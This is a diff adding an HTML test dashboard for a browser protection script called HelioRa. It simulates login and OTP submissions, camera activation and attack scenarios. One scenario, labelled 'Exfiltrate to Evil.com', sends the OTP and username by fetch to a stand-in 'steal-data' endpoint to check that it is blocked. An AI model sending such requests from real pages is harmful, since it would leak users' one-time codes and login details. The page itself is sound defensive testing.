@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HelioRa Security Test Suite</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #111;
+            color: #eee;
+            padding: 40px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        h1 { color: #FFD700; margin-bottom: 10px; }
+        h2 { border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 30px; }
+        .card {
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #333;
+            border: 1px solid #444;
+            color: #fff;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        button {
+            padding: 10px 20px;
+            border-radius: 6px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+        .btn-primary { background: #FFD700; color: #000; }
+        .btn-danger { background: #ff5252; color: #fff; }
+        .btn-secondary { background: #444; color: #ccc; }
+        
+        .status-box {
+            margin-top: 10px;
+            padding: 10px;
+            background: #1a1a1a;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #4ade80;
+        }
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-left: 10px;
+        }
+        .badge-test { background: #3b82f6; color: white; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div style="display: flex; justify-content: space-between; align-items: center;">
+        <h1>HelioRa Security Test</h1>
+        <span class="badge badge-test">Test Mode Active</span>
+    </div>
+    <p>Use this dashboard to verify the <strong>Decision & Explanation Layer</strong> logic.</p>
+
+    <div class="card">
+        <h2>1. Authentication Simulation</h2>
+        <p>Entering data here triggers the OTP detection logic (Risk +20).</p>
+        <form id="loginForm" onsubmit="return false;">
+            <input type="text" id="username" placeholder="Username / Email">
+            <input type="password" id="password" placeholder="Password">
+            <input type="text" id="otp" name="otp" placeholder="Enter 6-digit OTP (e.g., 123456)" autocomplete="one-time-code">
+        </form>
+    </div>
+
+    <div class="card">
+        <h2>2. Attack Scenarios</h2>
+        
+        <p><strong>Scenario A: Standard Submission (Yellow List)</strong><br>
+        Simulates a typical submission. Should trigger "Medium Risk" due to localhost/test environment.</p>
+        <button class="btn-primary" onclick="testSubmission('same-origin')">Submit Login (Same Origin)</button>
+
+        <p><strong>Scenario B: Cross-Origin Exfiltration (Hard Block)</strong><br>
+        Attempts to send your OTP to a different domain. Should be BLOCKED immediately.</p>
+        <button class="btn-danger" onclick="testSubmission('cross-origin')">Exfiltrate to Evil.com</button>
+        
+        <p><strong>Scenario C: High Risk Data (Yellow/Red)</strong><br>
+        Simulates sending highly sensitive keywords.</p>
+        <button class="btn-secondary" onclick="testSubmission('high-risk')">Submit "Secret Keys"</button>
+    </div>
+
+    <div class="card">
+        <h2>3. Surveillance Constraints</h2>
+        <p>Active camera/mic usage should trigger a <strong>Hard Block</strong> if you try to authenticate.</p>
+        <button class="btn-secondary" onclick="requestCam()">Activate Camera</button>
+        <button class="btn-primary" onclick="testSubmission('same-origin')">Try Auth with Camera On</button>
+        <div id="camStatus" class="status-box">Camera Status: Inactive</div>
+    </div>
+
+    <div class="status-box" id="consoleOutput">
+        System Log:<br>
+        > Ready for testing...
+    </div>
+</div>
+
+<!-- Load the Protection Script -->
+<script src="surveillance_protection.js"></script>
+
+<script>
+    function log(msg) {
+        const el = document.getElementById('consoleOutput');
+        el.innerHTML += '<br>> ' + msg;
+        el.scrollTop = el.scrollHeight;
+    }
+
+    async function requestCam() {
+        try {
+            log('Requesting Camera Access...');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('camStatus').innerHTML = 'Camera Status: <span style="color:#ff5252">ACTIVE</span>';
+            log('Camera Active! Now try submitting OTP.');
+            
+            // Keep it open for testing
+            window.localStream = stream;
+        } catch(e) {
+            log('Camera blocked or denied: ' + e.message);
+        }
+    }
+
+    async function testSubmission(type) {
+        const otp = document.getElementById('otp').value || '123456';
+        log(`Initiating ${type} submission...`);
+        
+        let url = '/api/login';
+        if (type === 'cross-origin') {
+            url = 'https://example.com/api/steal-data';
+        }
+        
+        const payload = {
+            otp: otp,
+            username: document.getElementById('username').value,
+            timestamp: Date.now()
+        };
+
+        try {
+            log('Sending fetch request...');
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            log('Response received: ' + response.status);
+        } catch(e) {
+            log('Request failed (Blocked): ' + e.message);
+        }
+    }
+</script>
+
+</body>
+</html>
